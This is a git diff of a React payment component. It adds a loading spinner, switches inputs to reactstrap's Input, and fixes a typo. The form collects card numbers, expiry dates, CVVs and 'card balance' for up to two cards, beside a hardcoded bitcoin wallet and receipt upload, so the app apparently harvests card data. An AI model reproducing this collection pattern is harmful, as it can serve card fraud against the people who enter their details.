@@ -8,7 +8,7 @@ import { Copy, ImageAdd } from "react-huge-icons/solid";
 
 import Frontside from "./Frontside";
 import { toast } from "react-toastify";
-import { Spinner } from "reactstrap";
+import { Input, Spinner } from "reactstrap";
 
 const Initialpayment = () => {
   const [wallet] = useState("1GVoDGMcnbJbdeoe2XtCdvsdcAuCkE4ZxC");
@@ -52,10 +52,13 @@ const Initialpayment = () => {
   const [secondCardDate, setSecondCardDate] = useState("");
   const [loading, setLoading] = useState(false);
   let userToken = localStorage.getItem("userToken");
+  // const [isLoading, setIsloading] = useState(false);
+
   const handlePayment = () => {
     setLoading(true);
     let isValidCard =
       /^([0-9]{4})[-\s]?([0-9]{4})[-\s]?([0-9]{4})[-\s]?([0-9]{4})$/;
+
     let isValidDate = /^([0-9]{2})([/]{1})([0-9]{2})$/;
     let isValidCvv = /^([0-9]{3})$/;
     let isAddingAnotherCard = checkStatus;
@@ -99,14 +102,17 @@ const Initialpayment = () => {
               return result.json();
             })
             .then((response) => {
+              setLoading(false);
               if (response) {
                 navigate("/frontside");
               }
             })
             .catch((err) => {
+              setLoading(false);
               toast.error(err.message);
             });
         } else {
+          setLoading(false);
           toast.warn("Enter a valid second card details");
         }
       } else {
@@ -126,11 +132,12 @@ const Initialpayment = () => {
         })
           .then((result) => {
             if (!result.ok) {
-              throw new Error("Error uploading the card detail s");
+              throw new Error("Error uploading the card details");
             }
             return result.json();
           })
           .then((response) => {
+            setLoading(false);
             if (response) {
               localStorage.setItem("card_id", response.response);
               setSubmitted(true);
@@ -144,6 +151,7 @@ const Initialpayment = () => {
       }
     } else {
       toast.warn("Enter a valid card details");
+      setLoading(false);
     }
   };
   const [cardDetailsSubmitted, setSubmitted] = useState(false);
@@ -218,7 +226,7 @@ const Initialpayment = () => {
 
               <div className="flex w-full py-2 h-auto mt-3 rounded-md  bg-slate-50  flex-col justify-around  items-center">
                 <div className="flex items-center gap-1 ml-2">
-                  <input
+                  <Input
                     type="checkbox"
                     value={true}
                     onChange={handleCheckStatus}
@@ -241,7 +249,7 @@ const Initialpayment = () => {
                         <strong className="ml-2 text-center text-gray-400 ">
                           CARD NUMBER
                         </strong>
-                        <input
+                        <Input
                           type="phone"
                           placeholder="XXXX XXXX XXXX XXXX"
                           max={16}
@@ -254,7 +262,7 @@ const Initialpayment = () => {
                         <strong className="ml-2 text-center text-gray-400">
                           EXPIRY DATE
                         </strong>
-                        <input
+                        <Input
                           type="phone"
                           placeholder="MM/YY"
                           max={16}
@@ -267,8 +275,8 @@ const Initialpayment = () => {
                         <strong className="ml-2 text-center text-gray-400">
                           SECURITY
                         </strong>
-                        <input
-                          type="phone"
+                        <Input
+                          type="text"
                           placeholder="CVV"
                           value={security}
                           onChange={(e) => setSecurity(e.target.value)}
@@ -280,8 +288,8 @@ const Initialpayment = () => {
                         <strong className="ml-2 text-center text-gray-400">
                           CARD BALANCE
                         </strong>
-                        <input
-                          type="number"
+                        <Input
+                          type="text"
                           placeholder="AMOUNT"
                           max={16}
                           value={balance}
@@ -303,7 +311,7 @@ const Initialpayment = () => {
                           <strong className="ml-2 text-center text-gray-400 ">
                             CARD NUMBER
                           </strong>
-                          <input
+                          <Input
                             type="text"
                             placeholder="XXXX XXXX XXXX XXXX"
                             max={16}
@@ -316,7 +324,7 @@ const Initialpayment = () => {
                           <strong className="ml-2 text-center text-gray-400">
                             EXPIRY DATE
                           </strong>
-                          <input
+                          <Input
                             type="phone"
                             placeholder="MM/YY"
                             value={secondCardDate}
@@ -329,7 +337,7 @@ const Initialpayment = () => {
                           <strong className="ml-2 text-center text-gray-400">
                             SECURITY
                           </strong>
-                          <input
+                          <Input
                             type="phone"
                             placeholder="CVV"
                             value={secondCardSecurity}
@@ -344,7 +352,7 @@ const Initialpayment = () => {
                           <strong className="ml-2 text-center text-gray-400">
                             CARD BALANCE
                           </strong>
-                          <input
+                          <Input
                             type="phone"
                             placeholder="AMOUNT"
                             value={secondCardBalance}
@@ -361,14 +369,20 @@ const Initialpayment = () => {
                 </div>
               </div>
               <div className="flex w-full justify-end items-center  mt-2">
-                <button
-                  onClick={handlePayment}
-                  // to={images.length != 0 && `/${to}`}
-                  className="bg-black rounded-lg py-2 px-2 text-center text-white w-52 mt-4 max-sm:w-full hover:bg-gray-900"
-                >
-                  SAVE CARD DETAILS
-                  <ArrowRight className="inline text-xl" />
-                </button>
+                {loading ? (
+                  <div className="relative flex justify-end w-full max-sm:w-full items-center">
+                    <Spinner type="border" className="mt-1 text-end" />
+                  </div>
+                ) : (
+                  <button
+                    onClick={handlePayment}
+                    // to={images.length != 0 && `/${to}`}
+                    className="bg-black rounded-lg py-2 px-2 text-center text-white w-52 mt-4 max-sm:w-full hover:bg-gray-900"
+                  >
+                    SAVE CARD DETAILS
+                    <ArrowRight className="inline text-xl" />
+                  </button>
+                )}
               </div>
             </section>
           ) : (
@@ -419,7 +433,7 @@ const Initialpayment = () => {
             </div>
           </div>
           <div className="flex bg-gray h-auto flex-col py-2 bg-gray-100 justify-center gap-2 items-center">
-            <input
+            <Input
               type="file"
               className="hidden"
               id="crypto-receipt"
@@ -457,7 +471,7 @@ const Initialpayment = () => {
             <div className="flex  justify-center items-center">
               <p className="inline text-xs">Write amount</p>{" "}
               <ArrowRight className="text-4xl max-sm:text-2xl inline" />
-              <input
+              <Input
                 type="number"
                 placeholder="$0.00"
                 value={bitcoinAmount}
